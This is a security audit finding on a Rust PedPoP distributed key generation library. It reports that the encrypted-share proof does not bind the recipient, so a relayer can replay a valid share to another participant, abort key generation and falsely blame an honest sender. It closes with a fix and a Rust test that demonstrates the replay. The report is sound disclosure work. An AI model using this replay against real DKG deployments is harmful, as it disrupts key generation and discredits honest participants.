### Title
Encrypted DKG share replay across recipients falsely marks the sender faulty - ([File: crypto/dkg/pedpop/src/encryption.rs](crypto/dkg/pedpop/src/encryption.rs))

### Summary
`EncryptedMessage` includes a Schnorr proof-of-possession for the ephemeral encryption key, but the challenge binds only the DKG context, claimed sender, ephemeral key, nonce, and ciphertext bytes. It does not bind the intended recipient or the recipient’s registered encryption public key.

An unprivileged relayer can therefore copy an `EncryptedMessage` produced by sender `S` for recipient `A` and submit the same serialized bytes as the message from `S` to recipient `B`. The proof still verifies because every field included in `pop_challenge` is unchanged. Recipient `B` then derives a different ECDH key and decrypts unrelated bytes.

### Finding Description
`encrypt` derives the ChaCha20 key from `ecdh(ephemeral_secret, recipient_encryption_key)`, but creates the proof with `pop_challenge(context, pub_nonce, pub_key, from, ciphertext)`. `pop_challenge` appends `context`, `nonce`, `key`, `sender`, and `message`; no recipient identifier or recipient encryption key is appended.

The same omitted recipient binding is used by both normal processing and blame evaluation:

- `Encryption::decrypt` verifies the PoP before deriving `ecdh(self.enc_key, msg.key)`.
- `Decryption::decrypt_with_proof` uses the same challenge when adjudicating blame.
- `KeyMachine::calculate_share` calls `self.encryption.decrypt(..., l, share_bytes)`, where `l` is the sender and the local recipient is implicit.

Because the recipient is implicit rather than signed, the same valid PoP can be replayed to another participant in the same DKG context.

### Impact Explanation
Recipient `B` accepts the copied message as cryptographically well-formed, derives the wrong shared key, and obtains garbage plaintext. `calculate_share` then returns `PedPoPError::InvalidShare` attributed to sender `S`.

If `B` submits a blame proof, `BlameMachine::blame_internal` decrypts the message and evaluates the resulting bytes as a secret share. Since the decrypted bytes are not the share originally encrypted for `A`, the sender is returned as faulty even though `S` produced a valid message for a different recipient.

This is a signature/proof replay caused by missing recipient binding. It can abort the DKG and cause an honest participant to be blamed.

### Likelihood Explanation
A relayer only needs access to the serialized `EncryptedMessage` bytes. No private key, malicious validator, collusion, or invalid encoding is required. The attack requires an authenticated-channel assumption to associate the copied bytes with sender `S`, which the PedPoP API explicitly expects callers to provide.

The attack works only within the same `context`, because the context is included in the PoP and cipher transcript. Replayed ciphertext is overwhelmingly invalid for the new recipient, making false blame reliable.

### Recommendation
Bind the recipient into `pop_challenge`, preferably by appending both:

- the recipient `Participant` index, and
- the recipient’s registered `enc_key` public key.

`encrypt` currently receives the recipient key as `to`, so it can pass that value into the challenge. `Encryption::decrypt` and `Decryption::decrypt_with_proof` already know the local participant and their registered encryption key, allowing verification to reconstruct the same challenge.

This prevents an encrypted share for one participant from being replayed as a well-formed message to another participant.

### Proof of Concept
```rust
#[test]
fn encrypted_share_replay_to_other_recipient_blames_sender() {
  use rand_core::OsRng;
  use ciphersuite::Ciphersuite;
  use dkg::{Participant, ThresholdParams};
  use pedpop::KeyGenMachine;
  use std::collections::HashMap;

  type C = ciphersuite::Ristretto;

  let params_a = ThresholdParams::new(3, 2, Participant::new(1).unwrap()).unwrap();
  let params_b = ThresholdParams::new(3, 2, Participant::new(2).unwrap()).unwrap();
  let params_c = ThresholdParams::new(3, 2, Participant::new(3).unwrap()).unwrap();
  let context = [7; 32];

  let (a_r1, a_msg) = KeyGenMachine::<C>::new(params_a, context)
    .generate_coefficients(&mut OsRng);
  let (b_r1, b_msg) = KeyGenMachine::<C>::new(params_b, context)
    .generate_coefficients(&mut OsRng);
  let (c_r1, c_msg) = KeyGenMachine::<C>::new(params_c, context)
    .generate_coefficients(&mut OsRng);

  let round1 = HashMap::from([
    (Participant::new(1).unwrap(), a_msg),
    (Participant::new(2).unwrap(), b_msg),
    (Participant::new(3).unwrap(), c_msg),
  ]);

  let (a_key, mut a_shares) =
    a_r1.generate_secret_shares(&mut OsRng, round1.clone()).unwrap();
  let (_b_key, mut b_shares) =
    b_r1.generate_secret_shares(&mut OsRng, round1.clone()).unwrap();
  let (c_key, mut c_shares) =
    c_r1.generate_secret_shares(&mut OsRng, round1).unwrap();

  // Take the valid encrypted share created by participant 1 for participant 2
  // and replay it as participant 1's share for participant 3.
  let replayed = a_shares.remove(&Participant::new(2).unwrap()).unwrap();
  c_shares.insert(Participant::new(1).unwrap(), replayed);

  // The copied PoP still verifies because the recipient was not bound into it.
  // Participant 3 consequently derives the wrong ECDH key and blames sender 1.
  let err = c_key.calculate_share(&mut OsRng, c_shares).unwrap_err();
  match err {
    pedpop::PedPoPError::InvalidShare { participant, .. } =>
      assert_eq!(participant, Participant::new(1).unwrap()),
    _ => panic!("expected replayed share to blame participant 1"),
  }
}
```
